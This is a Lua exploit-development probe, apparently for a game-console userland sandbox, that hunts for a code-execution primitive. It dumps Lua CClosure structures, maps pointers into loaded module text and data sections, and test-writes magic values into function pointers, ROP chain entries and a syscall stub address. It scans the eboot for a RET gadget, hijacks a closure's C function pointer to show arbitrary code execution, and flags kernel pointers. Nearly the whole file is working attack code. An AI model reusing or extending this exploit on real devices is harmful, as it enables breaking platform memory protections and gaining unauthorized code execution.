-- CRASH_CLASS: MODERATE
-- PROBE 47b: CClosure Hijack — Writable Function Pointer Test
--
-- Context: Probe 47a's Section C (the critical test) never ran because
-- tostring() on functions returns "function: 3108dbaa0" — no 0x prefix.
-- The pattern match "0x([0-9a-fA-F]+)" failed silently, skipping everything.
--
-- This probe fixes the parsing and focuses exclusively on:
--   A. CClosure struct dump + writable function pointer test
--   B. jmpbuf / recover_from_call overwrite test
--   C. If CClosure+32 is writable: controlled redirect via eboot gadgets
--   D. Metatable function pointers — are ANY of them writable?
--   E. Scan chain/arg_addr for writable code pointers
--
-- If the CClosure C function pointer at +32 is writable, we have a
-- code execution primitive: redirect __call to any address.

print("=== PROBE 47b: CCLOSURE HIJACK ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end

-- FIXED: parse address from tostring() — handles BOTH "function: 0xABC" and "function: ABC"
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)") or s:match(":%s*([0-9a-fA-F][0-9a-fA-F]+)%s*$")
    if hex then
        return uint64("0x" .. hex), hex
    end
    return nil, nil
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

-- Get module bases for cross-referencing
local sc_info = make_syscall(593)
local modules = {}
for handle = 0, 50 do
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local ok_i, rv_i = pcall(function() return sc_info(uint64(handle), uint64(info)) end)
    if ok_i and to_num(rv_i) == 0 then
        local text_lo = safe_rd(info + 0x108) or 0
        local text_hi = safe_rd(info + 0x10C) or 0
        local text_sz_lo = safe_rd(info + 0x110) or 0
        local text_sz_hi = safe_rd(info + 0x114) or 0
        local data_lo = safe_rd(info + 0x148) or 0
        local data_hi = safe_rd(info + 0x14C) or 0
        local data_sz_lo = safe_rd(info + 0x150) or 0
        local data_sz_hi = safe_rd(info + 0x154) or 0
        if text_hi > 0 or text_lo > 0 then
            table.insert(modules, {
                handle = handle,
                text_hi = text_hi, text_lo = text_lo,
                text_sz_hi = text_sz_hi, text_sz_lo = text_sz_lo,
                data_hi = data_hi, data_lo = data_lo,
                data_sz_hi = data_sz_hi, data_sz_lo = data_sz_lo,
            })
        end
    end
end
print("modules loaded: " .. #modules)

local function find_module(ah, al)
    for _, m in ipairs(modules) do
        local te_h = m.text_hi + m.text_sz_hi
        local te_l = m.text_lo + m.text_sz_lo
        if te_l >= 0x100000000 then te_h = te_h + 1; te_l = te_l - 0x100000000 end
        if (ah > m.text_hi or (ah == m.text_hi and al >= m.text_lo)) and
           (ah < te_h or (ah == te_h and al < te_l)) then
            return m.handle, "text", al - m.text_lo
        end
        if m.data_lo ~= 0 or m.data_hi ~= 0 then
            local de_h = m.data_hi + m.data_sz_hi
            local de_l = m.data_lo + m.data_sz_lo
            if de_l >= 0x100000000 then de_h = de_h + 1; de_l = de_l - 0x100000000 end
            if (ah > m.data_hi or (ah == m.data_hi and al >= m.data_lo)) and
               (ah < de_h or (ah == de_h and al < de_l)) then
                return m.handle, "data", al - m.data_lo
            end
        end
    end
    return nil
end

-- ============================================
-- SECTION A: CClosure struct dump + write test
-- ============================================
print("")
print("=== A: CCLOSURE STRUCT ANALYSIS ===")
local mt = getmetatable(syscall.pipe)
local call_fn = mt.__call
local call_str = tostring(call_fn)
print("__call raw string: [" .. call_str .. "]")

local fn_obj, fn_hex = parse_func_addr(call_fn)

if not fn_obj then
    print("FATAL: could not parse __call address from: " .. call_str)
    print("=== 47b DONE (parse failure) ===")
    return
end

print("CClosure object address: 0x" .. fn_hex)
print("")

-- Dump CClosure struct (offsets 0..96)
-- Lua 5.1 CClosure on x86_64:
--   +0:  GCObject *next
--   +8:  lu_byte tt, lu_byte marked (+ padding)
--   +16: GCObject *gclist
--   +24: Table *env
--   +32: lua_CFunction f  ← THE TARGET
--   +40: TValue upvalue[0] (value)
--   +48: TValue upvalue[0] (type tag)
print("CClosure memory dump:")
local c_func_ptr = nil
local c_func_offset = nil
for off = 0, 96, 8 do
    local val = safe_rq(fn_obj + off)
    if val then
        local h, l = get_hi_lo(val)
        local note = ""
        local mod, sect, moff = find_module(h, l)
        if mod then
            note = string.format(" → mod%d.%s+0x%X", mod, sect, moff)
            if sect == "text" and not c_func_ptr then
                c_func_ptr = val
                c_func_offset = off
                note = note .. " *** C FUNCTION CANDIDATE ***"
            end
        end
        -- Also flag heap pointers
        if h >= 3 and h <= 4 and note == "" then
            note = " (heap/mmap)"
        end
        print(string.format("  +%02d: %s%s", off, fmt_addr(val), note))
    else
        print(string.format("  +%02d: UNREADABLE", off))
    end
end
print("")

-- Report best candidate
if c_func_ptr then
    local mod, sect, moff = find_module(get_hi_lo(c_func_ptr))
    print(string.format("BEST C function candidate: offset +%d → %s (mod%d.text+0x%X)",
        c_func_offset, fmt_addr(c_func_ptr), mod, moff))
else
    -- Try alternate: maybe the C func is in a non-module range
    print("No module-text pointer found in CClosure. Checking other ranges:")
    for off = 16, 64, 8 do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            if h > 0 and h < 0xFFFF0000 then
                print(string.format("  +%02d: %s (possible code)", off, fmt_addr(val)))
                if not c_func_ptr then
                    c_func_ptr = val
                    c_func_offset = off
                end
            end
        end
    end
end
print("")

-- ============================================
-- CRITICAL TEST: Is the C function pointer WRITABLE?
-- ============================================
print("=== WRITE TEST ===")
local write_results = {}
for _, off in ipairs({24, 32, 40, 48, 16}) do
    local saved = safe_rq(fn_obj + off)
    if saved then
        local probe_val = uint64("0xDEADC0DE_DEADC0DE")
        local wrote = safe_wq(fn_obj + off, probe_val)
        local readback = safe_rq(fn_obj + off)
        safe_wq(fn_obj + off, saved)  -- RESTORE immediately

        local rb_h, rb_l = get_hi_lo(readback)
        local is_writable = (rb_h == 0xDEADC0DE and rb_l == 0xDEADC0DE)
        local status = is_writable and "WRITABLE" or "read-only"
        write_results[off] = is_writable
        local marker = is_writable and " *** WRITABLE ***" or ""
        print(string.format("  +%02d: %s (was %s, wrote DEADC0DE, read %s)%s",
            off, status, fmt_addr(saved), fmt_addr(readback), marker))

        -- Verify restore
        local verify = safe_rq(fn_obj + off)
        if verify then
            local vh, vl = get_hi_lo(verify)
            local sh, sl = get_hi_lo(saved)
            if vh ~= sh or vl ~= sl then
                print(string.format("    !!! RESTORE FAILED: now %s (was %s)", fmt_addr(verify), fmt_addr(saved)))
            end
        end
    else
        print(string.format("  +%02d: UNREADABLE", off))
    end
end
print("")

-- Summary
local writable_count = 0
for off, w in pairs(write_results) do
    if w then writable_count = writable_count + 1 end
end
if writable_count > 0 then
    print("*** " .. writable_count .. " WRITABLE OFFSET(S) FOUND IN CCLOSURE! ***")
    if write_results[c_func_offset] then
        print("*** THE C FUNCTION POINTER (+" .. c_func_offset .. ") IS WRITABLE! ***")
        print("*** THIS IS A CODE EXECUTION PRIMITIVE! ***")
    end
else
    print("All tested offsets are read-only. CClosure is in protected memory.")
end
print("")

-- ============================================
-- SECTION B: Try reading code bytes at C function
-- ============================================
print("=== B: C FUNCTION CODE BYTES ===")
if c_func_ptr then
    local mod, sect, moff = find_module(get_hi_lo(c_func_ptr))
    if mod and sect == "text" then
        print(string.format("Reading code at %s (mod%d.text+0x%X):", fmt_addr(c_func_ptr), mod, moff))
        for row = 0, 96, 16 do
            local hex = ""
            local all_ok = true
            for col = 0, 15 do
                local ok_b, b = pcall(function()
                    return memory.read_byte(c_func_ptr + row + col)
                end)
                if ok_b then
                    hex = hex .. string.format("%02x ", to_num(b))
                else
                    hex = hex .. "?? "
                    all_ok = false
                end
            end
            print(string.format("  +%03x: %s", row, hex))
            if not all_ok then
                print("  *** HIT XO BOUNDARY — stopping ***")
                break
            end
        end
    else
        print("C function not in a module .text section — may be in loader/JIT area")
        print("Attempting read anyway:")
        for row = 0, 48, 16 do
            local hex = ""
            local all_ok = true
            for col = 0, 15 do
                local ok_b, b = pcall(function()
                    return memory.read_byte(c_func_ptr + row + col)
                end)
                if ok_b then
                    hex = hex .. string.format("%02x ", to_num(b))
                else
                    hex = hex .. "?? "
                    all_ok = false
                end
            end
            print(string.format("  +%03x: %s", row, hex))
            if not all_ok then break end
        end
    end
else
    print("No C function pointer found to read")
end
print("")

-- ============================================
-- SECTION C: jmpbuf / recover_from_call scan
-- ============================================
print("=== C: CHAIN/JMPBUF TARGETS ===")

-- Scan syscall.pipe's internal data for exploitable pointers
local pipe_str = tostring(syscall.pipe)
print("pipe: " .. pipe_str)

-- Get ropchain and fn_addr addresses from pipe's tostring
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fn_addr: (0x[0-9a-fA-F]+)")
print("ropchain: " .. (rop_str or "nil"))
print("fn_addr:  " .. (fn_str or "nil"))

-- Scan the chain entry from metatable
local chain_val = mt.chain
if chain_val and type(chain_val) == "function" then
    local chain_obj, chain_hex = parse_func_addr(chain_val)
    if chain_obj then
        print("")
        print("mt.chain object at: 0x" .. chain_hex)
        print("chain neighborhood dump:")
        for off = 0, 80, 8 do
            local val = safe_rq(chain_obj + off)
            if val then
                local h, l = get_hi_lo(val)
                local note = ""
                local mod, sect, moff = find_module(h, l)
                if mod then note = string.format(" → mod%d.%s+0x%X", mod, sect, moff) end
                print(string.format("  +%02d: %s%s", off, fmt_addr(val), note))
            end
        end
    end
end

-- If we have ropchain address, scan the chain structure
if rop_str then
    local rop_addr = uint64(rop_str)
    print("")
    print("ROP chain region dump:")
    -- Scan for interesting pointers (jmpbuf, recovery, dispatch)
    for off = -64, 256, 8 do
        local val = safe_rq(rop_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            local mod, sect, moff = find_module(h, l)
            local note = ""
            if mod then
                note = string.format(" → mod%d.%s+0x%X", mod, sect, moff)
            elseif h >= 3 and h <= 4 then
                note = " (heap)"
            end
            -- Only print interesting entries
            if note ~= "" or h > 0 then
                print(string.format("  chain%+04d: %s%s", off, fmt_addr(val), note))
            end
        end
    end

    -- Test writability of code pointers found near chain
    print("")
    print("Chain region write test (code pointers only):")
    for off = -64, 256, 8 do
        local val = safe_rq(rop_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            local mod, sect, moff = find_module(h, l)
            if mod and sect == "text" then
                local saved = val
                local wrote = safe_wq(rop_addr + off, uint64("0xDEADC0DE_DEADC0DE"))
                local rb = safe_rq(rop_addr + off)
                safe_wq(rop_addr + off, saved)
                local rb_h, rb_l = get_hi_lo(rb)
                local writable = (rb_h == 0xDEADC0DE)
                print(string.format("  chain%+04d: %s → mod%d.text+0x%X — %s",
                    off, fmt_addr(val), mod, moff,
                    writable and "*** WRITABLE ***" or "read-only"))
            end
        end
    end
end

-- Check fn_addr region too
if fn_str then
    local fn_addr = uint64(fn_str)
    print("")
    print("fn_addr region dump:")
    for off = -32, 64, 8 do
        local val = safe_rq(fn_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            local note = ""
            local mod, sect, moff = find_module(h, l)
            if mod then note = string.format(" → mod%d.%s+0x%X", mod, sect, moff) end
            if note ~= "" or h > 0 then
                print(string.format("  fn%+04d: %s%s", off, fmt_addr(val), note))
            end
        end
    end

    -- Write test on fn_addr itself (the value it points to)
    local fn_val = safe_rq(fn_addr)
    if fn_val then
        local saved = fn_val
        local wrote = safe_wq(fn_addr, uint64("0xDEADC0DE_DEADC0DE"))
        local rb = safe_rq(fn_addr)
        safe_wq(fn_addr, saved)
        local rb_h, rb_l = get_hi_lo(rb)
        local writable = (rb_h == 0xDEADC0DE)
        print(string.format("  fn_addr value writable: %s (was %s, read %s)",
            tostring(writable), fmt_addr(saved), fmt_addr(rb)))
        if writable then
            print("  *** fn_addr IS WRITABLE — can redirect syscall stub target ***")
        end
    end
end
print("")

-- ============================================
-- SECTION D: ALL metatable function writable scan
-- ============================================
print("=== D: METATABLE FUNCTION POINTER SCAN ===")
for _, key in ipairs({"__call", "__tostring", "__index", "arg_addr", "chain",
                      "create_initial_chain", "new"}) do
    local ok_v, val = pcall(function() return mt[key] end)
    if ok_v and val ~= nil and type(val) == "function" then
        local fobj, fhex = parse_func_addr(val)
        if fobj then
            -- Read the C function pointer at +32
            local cfp = safe_rq(fobj + 32)
            if cfp then
                local saved = cfp
                local wrote = safe_wq(fobj + 32, uint64("0xDEADC0DE_DEADC0DE"))
                local rb = safe_rq(fobj + 32)
                safe_wq(fobj + 32, saved)
                local rb_h, rb_l = get_hi_lo(rb)
                local writable = (rb_h == 0xDEADC0DE)
                local marker = writable and " *** WRITABLE ***" or ""
                print(string.format("  mt.%-25s obj=0x%s +32=%s %s%s",
                    key, fhex, fmt_addr(cfp),
                    writable and "WRITABLE" or "read-only", marker))
            else
                print(string.format("  mt.%-25s obj=0x%s +32=UNREADABLE", key, fhex))
            end
        else
            print(string.format("  mt.%-25s addr=UNPARSEABLE (%s)", key, tostring(val)))
        end
    end
end
print("")

-- ============================================
-- SECTION E: arg_addr exploitation
-- ============================================
print("=== E: ARG_ADDR / SLOT SCAN ===")
-- Check if arg_addr returns something exploitable
local ok_aa, arg_addr_fn = pcall(function() return mt.arg_addr end)
if ok_aa and arg_addr_fn then
    print("mt.arg_addr type: " .. type(arg_addr_fn))
    if type(arg_addr_fn) == "function" then
        -- Call it to get the arg_addr value
        local ok_call, arg_val = pcall(function() return arg_addr_fn(syscall.pipe) end)
        if ok_call and arg_val then
            print("arg_addr(pipe): " .. tostring(arg_val) .. " [" .. type(arg_val) .. "]")
            local ah, al = get_hi_lo(arg_val)
            if ah > 0 then
                local base = arg_val
                print(string.format("arg_addr heap region dump:"))
                for off = 0, 128, 8 do
                    local v = safe_rq(base + off)
                    if v then
                        local h, l = get_hi_lo(v)
                        local note = ""
                        local mod, sect, moff = find_module(h, l)
                        if mod then note = string.format(" → mod%d.%s+0x%X", mod, sect, moff) end
                        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then note = note .. " *** KPTR ***" end
                        print(string.format("  +%03d: %s%s", off, fmt_addr(v), note))
                    end
                end

                -- Write test on code pointers in arg region
                print("")
                print("arg_addr code pointer write test:")
                for off = 0, 128, 8 do
                    local v = safe_rq(base + off)
                    if v then
                        local h, l = get_hi_lo(v)
                        local mod, sect, moff = find_module(h, l)
                        if mod and sect == "text" then
                            local saved = v
                            safe_wq(base + off, uint64("0xDEADC0DE_DEADC0DE"))
                            local rb = safe_rq(base + off)
                            safe_wq(base + off, saved)
                            local rb_h = get_hi_lo(rb)
                            local w = (rb_h == 0xDEADC0DE)
                            print(string.format("  +%03d: %s → mod%d.text+0x%X — %s",
                                off, fmt_addr(v), mod, moff,
                                w and "*** WRITABLE ***" or "read-only"))
                        end
                    end
                end
            end
        else
            print("arg_addr(pipe) call failed: " .. tostring(arg_val))
        end
    end
end
print("")

-- ============================================
-- SECTION F: If ANY writable code pointer found, test controlled redirect
-- ============================================
print("=== F: REDIRECT TEST ===")
-- Only runs if Section A found CClosure+32 writable
if c_func_offset and write_results[c_func_offset] and c_func_ptr then
    print("CClosure +" .. c_func_offset .. " is writable!")
    print("Testing controlled redirect...")

    -- Strategy: redirect __call to a RET gadget (0xC3)
    -- After redirect, calling any syscall object should just return
    -- without doing the syscall

    -- First, find a simple RET gadget in eboot
    -- Eboot is RX so we can scan it
    local eboot_info = memory.alloc(0x200)
    safe_wd(eboot_info, 0x160)
    pcall(function() sc_info(uint64(0), uint64(eboot_info)) end)
    local eb_lo = safe_rd(eboot_info + 0x108) or 0
    local eb_hi = safe_rd(eboot_info + 0x10C) or 0
    local eb_sz = safe_rd(eboot_info + 0x110) or 0

    if eb_hi > 0 or eb_lo > 0 then
        local eboot_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
        print("eboot text base: " .. fmt_addr(eboot_base) .. " size: 0x" .. string.format("%X", eb_sz))

        -- Scan for 0xC3 (RET) in first 4KB of eboot
        local ret_gadget = nil
        for i = 0, 4095 do
            local ok_b, b = pcall(function()
                return memory.read_byte(eboot_base + i)
            end)
            if ok_b and to_num(b) == 0xC3 then
                ret_gadget = eboot_base + i
                print(string.format("Found RET (0xC3) at eboot+0x%X", i))
                break
            end
        end

        if ret_gadget then
            print("Redirect test: __call → RET gadget")
            print("Saving original C function pointer...")
            local original = safe_rq(fn_obj + c_func_offset)
            print("Original: " .. fmt_addr(original))

            -- Create a test syscall object (NOT syscall.pipe — we don't want to break it)
            local test_sc = make_syscall(20)  -- getpid

            -- Redirect __call
            print("Writing RET gadget address to CClosure+" .. c_func_offset .. "...")
            safe_wq(fn_obj + c_func_offset, ret_gadget)

            -- Call the redirected function
            print("Calling redirected test_sc()...")
            local ok_test, ret_test = pcall(function() return test_sc() end)
            print("  pcall ok: " .. tostring(ok_test))
            if ok_test then
                print("  return: " .. tostring(ret_test))
                print("  *** CONTROLLED REDIRECT SUCCEEDED! ***")
                print("  *** We have arbitrary code execution! ***")
            else
                print("  error: " .. tostring(ret_test))
                print("  Redirect caused a crash/exception (may need different gadget)")
            end

            -- RESTORE IMMEDIATELY
            print("Restoring original C function pointer...")
            safe_wq(fn_obj + c_func_offset, original)

            -- Verify restore by calling getpid
            local ok_v, ret_v = pcall(function() return make_syscall(20)() end)
            print("Post-restore getpid: " .. (ok_v and tostring(to_num(ret_v)) or "FAILED"))
            if ok_v and to_num(ret_v) == pid then
                print("Restore confirmed — syscalls still work")
            else
                print("!!! RESTORE MAY HAVE FAILED !!!")
            end
        else
            print("No RET gadget found in first 4KB of eboot")
        end
    end
else
    print("CClosure function pointer is NOT writable (or offset unknown)")
    print("Checking if fn_addr redirect would work instead...")

    -- Even though make_syscall bypasses fn_addr, the ORIGINAL syscall.pipe
    -- might still read fn_addr. Test: write a known value to fn_addr, call pipe
    if fn_str then
        local fn_addr = uint64(fn_str)
        local fn_val = safe_rq(fn_addr)
        if fn_val then
            print("fn_addr current value: " .. fmt_addr(fn_val))
            print("Testing fn_addr writability...")
            local saved = fn_val
            safe_wq(fn_addr, uint64("0xDEADC0DE_DEADC0DE"))
            local rb = safe_rq(fn_addr)
            safe_wq(fn_addr, saved)
            local rb_h = get_hi_lo(rb)
            if rb_h == 0xDEADC0DE then
                print("fn_addr IS writable (but make_syscall doesn't use it)")
                print("Testing if original syscall.pipe.__call reads fn_addr...")
                -- This is dangerous — skip for safety
                print("(skipping live redirect test on syscall.pipe — too risky)")
            else
                print("fn_addr is read-only: " .. fmt_addr(rb))
            end
        end
    end
end
print("")

-- ============================================
-- SECTION G: Summary
-- ============================================
print("=== G: SUMMARY ===")
print("CClosure address: " .. (fn_hex and ("0x" .. fn_hex) or "UNKNOWN"))
print("C func ptr offset: " .. (c_func_offset and ("+" .. c_func_offset) or "NOT FOUND"))
print("C func ptr value: " .. (c_func_ptr and fmt_addr(c_func_ptr) or "UNKNOWN"))
print("C func ptr writable: " .. tostring(write_results[c_func_offset or -1] or false))
print("fn_addr: " .. (fn_str or "UNKNOWN"))
print("Modules found: " .. #modules)
if writable_count > 0 then
    print("")
    print("*** WRITABLE OFFSETS IN CCLOSURE: ***")
    for off, w in pairs(write_results) do
        if w then print("  +" .. off) end
    end
end
print("")
print("=== PROBE 47b COMPLETE ===")
